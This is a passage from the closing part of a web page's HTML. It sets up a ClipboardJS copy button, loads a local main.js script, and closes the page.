    var clip = new ClipboardJS('.btn-copy', {
      target: function(trigger) {
        return trigger.nextElementSibling;
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

</body>
</html>
